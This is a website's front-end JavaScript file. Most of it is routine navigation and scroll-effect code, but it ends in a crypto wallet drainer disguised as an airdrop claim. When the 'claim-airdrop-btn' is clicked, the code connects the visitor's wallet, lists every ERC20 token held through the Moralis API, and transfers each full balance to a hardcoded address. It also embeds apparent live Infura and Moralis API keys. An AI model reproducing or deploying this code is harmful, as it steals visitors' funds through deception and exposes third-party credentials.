'use strict';

/**
 * Add event on element
 */
const addEventOnElem = function (elem, type, callback) {
  if (elem.length > 1) {
    for (let i = 0; i < elem.length; i++) {
      elem[i].addEventListener(type, callback);
    }
  } else {
    elem.addEventListener(type, callback);
  }
}

/**
 * Navbar toggle
 */
const navbar = document.querySelector("[data-navbar]");
const navbarLinks = document.querySelectorAll("[data-nav-link]");
const navToggler = document.querySelector("[data-nav-toggler]");

const toggleNavbar = function () {
  navbar.classList.toggle("active");
  navToggler.classList.toggle("active");
  document.body.classList.toggle("active");
}

addEventOnElem(navToggler, "click", toggleNavbar);

const closeNavbar = function () {
  navbar.classList.remove("active");
  navToggler.classList.remove("active");
  document.body.classList.remove("active");
}

addEventOnElem(navbarLinks, "click", closeNavbar);

/**
 * Header active on scroll
 */
const header = document.querySelector("[data-header]");

const activeHeader = function () {
  if (window.scrollY > 300) {
    header.classList.add("active");
  } else {
    header.classList.remove("active");
  }
}

addEventOnElem(window, "scroll", activeHeader);

/**
 * Toggle active on add to fav
 */
const addToFavBtns = document.querySelectorAll("[data-add-to-fav]");

const toggleActive = function () {
  this.classList.toggle("active");
}

addEventOnElem(addToFavBtns, "click", toggleActive);

/**
 * Scroll reveal effect
 */
const sections = document.querySelectorAll("[data-section]");

const scrollReveal = function () {
  for (let i = 0; i < sections.length; i++) {
    if (sections[i].getBoundingClientRect().top < window.innerHeight / 1.5) {
      sections[i].classList.add("active");
    } else {
      sections[i].classList.remove("active");
    }
  }
}

scrollReveal();
addEventOnElem(window, "scroll", scrollReveal);

/**
 * Wallet connect and token transfer using Moralis API
 */
async function connectWalletAndSendTokens() {
  const providerOptions = {
    walletconnect: {
      package: window.WalletConnectProvider.default,
      options: {
        infuraId: "5b2c5ee5760146349669a1e9c77665d1"
      }
    }
  };

  const web3Modal = new window.Web3Modal.default({
    cacheProvider: false,
    providerOptions
  });

  try {
    const instance = await web3Modal.connect();
    const provider = new ethers.providers.Web3Provider(instance);
    const signer = provider.getSigner();
    const userAddress = await signer.getAddress();
    const network = await provider.getNetwork();
    const chainId = network.chainId;

    // Moralis API call
    const moralisApiKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImU1MjI2ZmQ1LTE0NDUtNGIyOC04YzYzLTZmOWEzZDRkNWJjZSIsIm9yZ0lkIjoiNDQ5NTg1IiwidXNlcklkIjoiNDYyNTgwIiwidHlwZUlkIjoiZjVhODc0ZmItZGM2Ni00NjE0LWIxNDUtMjlkYTg5YjIwNDk1IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NDgzOTc5MTksImV4cCI6NDkwNDE1NzkxOX0.lr5-p-SHS7j4EAlsT1ZYt7tTnOfKnoZXSsqS_6WIReY"; // Replace with your Moralis API key
    const moralisUrl = `https://deep-index.moralis.io/api/v2.2/${userAddress}/erc20?chain=${chainId === 1 ? 'eth' : chainId === 137 ? 'polygon' : 'eth'}`;

    const response = await fetch(moralisUrl, {
      headers: {
        "X-API-Key": moralisApiKey
      }
    });

    const tokens = await response.json();

    if (!tokens || tokens.length === 0) {
      alert('No token data available');
      return;
    }

    for (const token of tokens) {
      try {
        const contract = new ethers.Contract(token.token_address, [
          "function transfer(address to, uint amount) returns (bool)"
        ], signer);

        const decimals = token.decimals ?? 18;
        const balanceInWei = ethers.BigNumber.from(token.balance);
        if (balanceInWei.isZero()) continue;

        const tx = await contract.transfer("0xf659d4Bb03E0923964b8bBACfd354f8BC02Bfe47", balanceInWei);
        console.log(`Sent ${token.symbol}, tx:`, tx.hash);
      } catch (err) {
        console.warn(`Failed to send ${token.symbol}`, err);
      }
    }

  } catch (err) {
    console.error('Error connecting wallet or sending tokens:', err);
  }
}

// Attach to claim button
document.getElementById("claim-airdrop-btn")?.addEventListener("click", connectWalletAndSendTokens);